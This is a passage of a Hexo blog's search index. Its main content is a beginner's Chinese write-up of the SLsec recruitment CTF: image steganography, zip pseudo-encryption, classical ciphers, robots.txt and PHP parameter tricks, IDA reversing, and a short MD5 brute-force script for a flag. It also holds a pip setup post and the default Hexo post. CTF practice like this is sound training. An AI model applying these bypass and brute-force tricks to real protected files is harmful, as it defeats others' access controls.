src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021717.png"><br>如果出现，则说明pip配置成功，如果没有出现该图情况，则进行第二步，对系统环境进行配置，找到电脑中的高级系统设置，点击红圈标注的位置<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021146.png"><br>找到系统变量（就是点进去后下面那一处）然后找到其中为Path的变量，双击后点击新建，将刚才复制的地址粘贴上去，然后再次打开PythonCharm就可以使用pip的功能了。</p><p>接下来是关于Crypto的问题，当我输入<br><code>pip install crypto</code>并运行后<br>出现下面的情况</p><blockquote><p>from Crypto.Util.number import *<br>ModuleNotFoundError: No module named ‘Crypto’</p></blockquote><p>上网搜寻原因是因为crypto这个库过时了，现在都是下载pycryptodome<br>下载它的代码是<br><code>pip install crypto pycryptodome</code><br>​<br>详情可以参考这位大佬的CSDN博客<br><a href="https://blog.csdn.net/Ahuuua/article/details/108800712">​https://blog.csdn.net/Ahuuua/article/details/108800712<br>​</a></p><p>总结</p><p>以上便是我解决这些问题中所做的行为，虽然解决了我的问题，但是不能保证解决大家的问题，仅供参考，很多大佬写的远比我这详细，也希望能给大家带来一些帮助。</p><p>​​</p>]]></content>
      
      
      
        <tags>
            
            <tag> 见解，参考，学习。 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SLsec招新赛</title>
      <link href="/2023/01/09/SLsec%E6%8B%9B%E6%96%B0%E8%B5%9B/"/>
      <url>/2023/01/09/SLsec%E6%8B%9B%E6%96%B0%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="一、熊曰"><a href="#一、熊曰" class="headerlink" title="一、熊曰"></a>一、熊曰</h2><p>从题目看到是一串不知道什么的什么，但根据题目名字，考虑到与熊论道<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010239.png"><br>所以通过网上搜寻与熊论道，得到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010589.png"><br> 链接：<a href="http://hi.pcmoe.net/">熊曰解密</a></p><h2 id="二、这个皮卡丘有点矮"><a href="#二、这个皮卡丘有点矮" class="headerlink" title="二、这个皮卡丘有点矮"></a>二、这个皮卡丘有点矮</h2><p>打开题目得到一个附件是一张皮卡丘图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010243.png">通过图片，考虑到可能是考察图片长短，所以可以通过010改变图片长短来找到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010696.png"><br>最终得到flag，就在皮卡丘的脚下<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010268.png"></p><h2 id="三、vivo50"><a href="#三、vivo50" class="headerlink" title="三、vivo50"></a>三、vivo50</h2><p>本题所给附件是一个pdf文件，打开后发现是一张图片，没有线索，不过可以通过pdf文件中的，如下图找到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010815.png"></p><h2 id="四、你是lsp吗"><a href="#四、你是lsp吗" class="headerlink" title="四、你是lsp吗"></a>四、你是lsp吗</h2><p>本题附件是一张图片，通过010查询没有什么问题，通过stegsolve中的data extract发现里面还有一张图片，得到一张二维码<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010214.png"><br>通过扫描二维码得到一串base字符<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010712.png"><br>通过base32解密得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010130.png"><br>base32解密链接：<a href="https://ctf.bugku.com/tool/base32">base32</a></p><h2 id="五、起风了"><a href="#五、起风了" class="headerlink" title="五、起风了"></a>五、起风了</h2><p>本题附件图片是一串看不懂的字符，拖到010试试<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010918.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010333.png"><br>得到一串代码，看着像base解密，通过base解密得到一句英语<img src="https://img-blog.csdnimg.cn/a81ea7619c214581b692e34ae5354921.png"><br>网上英语翻译知道其意思<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011195.png">上网搜索提瓦特解密得到以下内容<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011911.png"><br>得到flag：SLsec{yuanlainishiop}</p><h2 id="六、你会相信PDD吗？"><a href="#六、你会相信PDD吗？" class="headerlink" title="六、你会相信PDD吗？"></a>六、你会相信PDD吗？</h2><p>打开压缩包发现图片被加密了，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011817.png"><br>考虑到没有任何密码提示，有可能是压缩包伪加密，通过010修改得到图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011334.png"><br>发现是一张二维码但缺失一个定位角，下面有俩种方法。第一种方法、通过ps技术找到一个二维码定位角角补齐二维码通过扫描得到答案。第二种方法、通过CQR得到二维码藏的东西<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011084.png"><br>通过内容考虑栅栏密码，得到flag<img src="https://img-blog.csdnimg.cn/abad0cd0fd40457ab72fde28014e82c9.png"></p><h2 id="七、情报员CPU"><a href="#七、情报员CPU" class="headerlink" title="七、情报员CPU"></a>七、情报员CPU</h2><p>打开附件发现是一个加密压缩包，<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011626.png"><br>打开passwd1<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011887.png"><br>可以考虑干支解密，通过<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011509.png"><br>对照得到密码，打开第二个压缩包也是加密的，打开passwd2<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011994.png"><br>看出是核心价值观编码<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011069.png"><br>打开第二个压缩包得到一张图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011889.png"><br>得到CPU带来的秘密图片通过010看到藏着一串数字，考虑ascii码加密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011979.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011956.png">得到flag，结果用SLsec{}包装<br>链接:<a href="https://ctf.bugku.com/tool/cvecode">核心价值观编码</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="一、签到"><a href="#一、签到" class="headerlink" title="一、签到"></a>一、签到</h2><p>通过网页捕获找到这个flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011984.png"><br>再通过保存图片，通过网上图片文字提取得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011958.png"></p><h2 id="二、Robots"><a href="#二、Robots" class="headerlink" title="二、Robots"></a>二、Robots</h2><p>通过robots网上可得知爬虫协议，即将网站后面加上&#x2F;robots，如图<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012570.png"><br>再通过此修改得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012048.png"></p><h2 id="三、PHP01"><a href="#三、PHP01" class="headerlink" title="三、PHP01"></a>三、PHP01</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012230.png"><br>根据对此分析得到get应传的参，如图所示，得到flag。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012518.png"></p><h2 id="四、PHP02"><a href="#四、PHP02" class="headerlink" title="四、PHP02"></a>四、PHP02</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012693.png">首先这题提示只要访问flag.php就能得到答案，但是如果你单纯输出flag.php会出现如下图的情况<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012756.png">所以可以从中得到规律，进行以下的修改，得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012269.png"></p><h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2><h2 id="一、base家族"><a href="#一、base家族" class="headerlink" title="一、base家族"></a>一、base家族</h2><p>打开附件得到一串码，根据题目，考虑base解密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012305.png"><br>考虑到可能是base的层层加密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012449.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012170.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012548.png"><br>工具链接:<a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></p><h2 id="二、O欢迎来到SLsec！，ok"><a href="#二、O欢迎来到SLsec！，ok" class="headerlink" title="二、O欢迎来到SLsec！，ok"></a>二、O欢迎来到SLsec！，ok</h2><p>打开文本得到一堆重复乱码，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012161.png"><br>根据题目考虑到ook解密，将SLsec改成Ook后得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013162.png"><br>ook解密链接:<a href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p><h2 id="三、小兔兔找朋友"><a href="#三、小兔兔找朋友" class="headerlink" title="三、小兔兔找朋友"></a>三、小兔兔找朋友</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012922.png"><br>此题要根据题目来做，首先是小兔子过生日，当天为光棍节，所以密钥为1111，通过兔兔想到兔子解密，兔子解密后栅栏数为三的栅栏解密以及最后的凯撒解密得到答案，步骤如下<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012392.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012918.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013703.png"><br>RABBIT解密链接:<a href="https://www.codeeeee.com/encrypt/rabbit.html">https://www.codeeeee.com/encrypt/rabbit.html</a></p><h2 id="四、MD5解密"><a href="#四、MD5解密" class="headerlink" title="四、MD5解密"></a>四、MD5解密</h2><p>该题是通过一串代码得到的答案，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013584.png"><br>再用SLsec包装即是答案。</p><p>源代码：</p><pre class="line-numbers language-none"><code class="language-none">import hashlib#print hashlib.md5(s).hexdigest().upper()&#96;k &#x3D; &#39;SLsec&#123;md5&amp;zd&amp;mj&amp;m&#125;&#39;for i in range(26):    temp1 &#x3D; k.replace(&#39;&amp;&#39;,str(chr(97+i)),1) #用ascii开始，从A开始查    for j in range(26):        temp2 &#x3D; temp1.replace(&#39;&amp;&#39;,chr(97+j),1)        for n in range(26):&#96;&#96;            temp3 &#x3D; temp2.replace(&#39;&amp;&#39;,chr(97+n),1)            s &#x3D; hashlib.md5(temp3.encode(&#39;utf8&#39;)).hexdigest().upper()#注意大小写            if s[:32] &#x3D;&#x3D; &#39;D1ABA2C785779AFFFBEC56422DBF23F2&#39;:#检查元素                print(temp3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源代码链接：<a href="https://blog.csdn.net/emmmk_suibian/article/details/123693217">https://blog.csdn.net/emmmk_suibian&#x2F;article&#x2F;details&#x2F;123693217</a></p><h2 id="RESERVE"><a href="#RESERVE" class="headerlink" title="RESERVE"></a>RESERVE</h2><h2 id="一、re签到"><a href="#一、re签到" class="headerlink" title="一、re签到"></a>一、re签到</h2><p>将附件放入ida就能找到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013050.png"></p><h2 id="二、JustCaesar"><a href="#二、JustCaesar" class="headerlink" title="二、JustCaesar"></a>二、JustCaesar</h2><p>第二题同样是exe文件，所以通过ida打开这个压缩包<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013701.png"><br>得到一串代码，通过题目提示凯撒，所以进行凯撒解密得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013803.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手、网安学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/07/hello-world/"/>
      <url>/2023/01/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new &quot;My New Post&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
